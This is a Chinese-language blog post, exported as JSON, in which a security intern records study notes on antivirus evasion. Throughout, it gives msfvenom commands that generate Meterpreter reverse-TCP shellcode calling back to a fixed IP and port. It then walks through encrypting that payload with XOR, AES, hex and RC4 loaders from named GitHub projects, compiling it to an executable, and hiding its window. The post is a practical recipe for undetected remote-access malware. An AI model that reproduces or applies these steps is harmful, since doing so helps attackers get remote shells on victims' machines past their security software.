{"title":"免杀入门-小迪笔记","uid":"170904693726acf3c72f07df195a2a4e","slug":"免杀入门-小迪笔记","date":"2022-09-05T11:23:50.000Z","updated":"2022-09-05T11:32:27.989Z","comments":true,"path":"api/articles/免杀入门-小迪笔记.json","keywords":null,"cover":null,"content":"<h1 id=\"杀软检测方式\"><a href=\"#杀软检测方式\" class=\"headerlink\" title=\"杀软检测方式\"></a>杀软检测方式</h1><p>在shellcode代码中包含了服务器的IP及监听端口，直接使用shellcode上线会被杀软检测到</p>\n<h1 id=\"免杀常见初始思路\"><a href=\"#免杀常见初始思路\" class=\"headerlink\" title=\"免杀常见初始思路\"></a>免杀常见初始思路</h1><h2 id=\"加载方式\"><a href=\"#加载方式\" class=\"headerlink\" title=\"加载方式\"></a>加载方式</h2><p>修改各种shellcode加载方式达到免杀效果</p>\n<p>如常见加载器项目：Callback_Shellcode_Injection</p>\n<p><a href=\"https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection\">https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection</a></p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c</p>\n<p>但是使用过多已经完全被pass</p>\n<p>替换shellcode为自己的shellcode</p>\n<h2 id=\"编码混淆加密算法\"><a href=\"#编码混淆加密算法\" class=\"headerlink\" title=\"编码混淆加密算法\"></a>编码混淆加密算法</h2><p>利用常见的编码方式，如：Xor Aes Hex Rc4 Rsa等</p>\n<p>将shellcode编码，再到源文件加载前进行解码</p>\n<h3 id=\"xor和aes加密metasploit的x86初始类型的shellcode\"><a href=\"#xor和aes加密metasploit的x86初始类型的shellcode\" class=\"headerlink\" title=\"xor和aes加密metasploit的x86初始类型的shellcode\"></a>xor和aes加密metasploit的x86初始类型的shellcode</h3><p>使用该项目：<a href=\"https://github.com/Arno0x/ShellcodeWrapper\">https://github.com/Arno0x/ShellcodeWrapper</a></p>\n<p>生成raw类型shellcode文件</p>\n<p>msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=175.178.41.176 LPORT=6666 -f raw &gt; shellcode.raw</p>\n<p>脚本使用方式，本地安装requestments有问题</p>\n<p>加密库安装有问题，需要安装c++14.0 用vs studio安装</p>\n<p>使用python39 报错语法有问题，切换成py2可以加密成功</p>\n<p>工具下载最新的，防止bug</p>\n<p>python2 shellcode_encoder.py -cpp -cs -py shellcode.raw key xor</p>\n<p>python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi xor</p>\n<p>-表示输出的文件类型，直接可编译，以上输出cpp，cs，py三种类型，cs是c#文件</p>\n<p>key表示加密密钥</p>\n<p>xor表示加密方式</p>\n<ul>\n<li>encryptedShellcodeWrapper.cpp- 目前<strong>仅</strong>支持XOR 加密</li>\n<li>encryptedShellcodeWrapper.cs- 支持 XOR 和 AES 加密</li>\n<li>encryptedShellcodeWrapper.py- 支持 XOR 和 AES 加密</li>\n</ul>\n<p>生成的cpp文件打开后显示头文件错误，直接注释那一行</p>\n<p>之后将cpp文件生成exe</p>\n<p>cs编译  **C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319&gt;**csc /out:D:\\BaiduNetdiskDownload\\test\\test.exe D:\\BaiduNetdiskDownload\\test\\encryptedShellcodeWrapper_xor.cs</p>\n<p>msf开启监听，测试脚本是否能上线</p>\n<p>exe执行报错，执行发现缺少dll文件，应该是x86的原因，测试一下其他的</p>\n<p><strong>项目写的有问题，不用测试了，md，生成的文件编译后执行都有问题</strong></p>\n<p><strong>使用python3生成，但是python3生成时语法报错，真是个垃圾项目</strong></p>\n<p><strong>还有小迪自己编写的加密代码xor.py</strong></p>\n<p>python xor.py -s shellcode.bin -d payload.c -n 10 -r out.bin</p>\n<h3 id=\"hex加密\"><a href=\"#hex加密\" class=\"headerlink\" title=\"hex加密\"></a>hex加密</h3><p>使用shellcodelloader.exe生成exe文件</p>\n<p>生成payload，将生成的payload去掉   “  ,可能不能存在换行</p>\n<p>下载下来，使用工具生成exe，运行报错</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c</p>\n<p><a href=\"https://gchq.github.io/CyberChef/\">https://gchq.github.io/CyberChef/</a></p>\n<p><a href=\"https://github.com/ByPassAVTeam/ShellcodeLoader\">https://github.com/ByPassAVTeam/ShellcodeLoader</a></p>\n<p>LoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)</p>\n<h3 id=\"Rc4加密\"><a href=\"#Rc4加密\" class=\"headerlink\" title=\"Rc4加密\"></a>Rc4加密</h3><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c</p>\n<p><a href=\"https://blog.csdn.net/weixin_45590789/article/details/105536623\">https://blog.csdn.net/weixin_45590789/article/details/105536623</a></p>\n<p>使用方法，将rc4.cpp中的shellcode替换成msf生成的shellcode</p>\n<p>用vs调试，会生成加密后的shellcode，再将msf生成的shellcode替换为加密shellcode</p>\n<p>之后生成exe，可以将代码里的打印去掉，打印会导致弹窗打印</p>\n<p>前面也可以加上隐藏窗口代码</p>\n","text":"杀软检测方式在shellcode代码中包含了服务器的IP及监听端口，直接使用shellcode上线会被杀软检测到 免杀常见初始思路加载方式修改各种shellcode加载方式达到免杀效果 如常见加载器项目：Callback_Shellcode_Injection https://g...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"python","slug":"python","count":2,"path":"api/categories/python.json"}],"tags":[{"name":"免杀","slug":"免杀","count":2,"path":"api/tags/免杀.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%9D%80%E8%BD%AF%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">杀软检测方式</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%8D%E6%9D%80%E5%B8%B8%E8%A7%81%E5%88%9D%E5%A7%8B%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">免杀常见初始思路</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">加载方式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BC%96%E7%A0%81%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95\"><span class=\"toc-text\">编码混淆加密算法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#xor%E5%92%8Caes%E5%8A%A0%E5%AF%86metasploit%E7%9A%84x86%E5%88%9D%E5%A7%8B%E7%B1%BB%E5%9E%8B%E7%9A%84shellcode\"><span class=\"toc-text\">xor和aes加密metasploit的x86初始类型的shellcode</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#hex%E5%8A%A0%E5%AF%86\"><span class=\"toc-text\">hex加密</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Rc4%E5%8A%A0%E5%AF%86\"><span class=\"toc-text\">Rc4加密</span></a></li></ol></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java反射笔记","uid":"a87dfbaadf5431aac0df9631c18a8ee5","slug":"Java反射笔记","date":"2022-09-05T11:36:43.000Z","updated":"2022-09-05T12:22:46.244Z","comments":true,"path":"api/articles/Java反射笔记.json","keywords":null,"cover":null,"text":"参考资料： 廖雪峰老师Java教程 反射 https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512 p牛Java安全漫谈 反射篇1，2，3 https://t.zsxq.com/056qbMzVV htt...","link":"","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":22,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"python免杀-小迪笔记","uid":"8d7177d71a9701596b230fd390060764","slug":"python免杀-小迪笔记","date":"2022-08-17T09:26:05.000Z","updated":"2022-09-05T11:26:44.457Z","comments":true,"path":"api/articles/python免杀-小迪笔记.json","keywords":null,"cover":null,"text":" python免杀 小迪安全加载shellcode方式首先是shellcode两种常见的利用python的加载方式 import ctypes shellcode &#x3D; b&#39;&#39; rwxpage &#x3D; ctypes.windll.kernel32.V...","link":"","photos":[],"count_time":{"symbolsCount":"22k","symbolsTime":"20 mins."},"categories":[{"name":"python","slug":"python","count":2,"path":"api/categories/python.json"}],"tags":[{"name":"免杀","slug":"免杀","count":2,"path":"api/tags/免杀.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}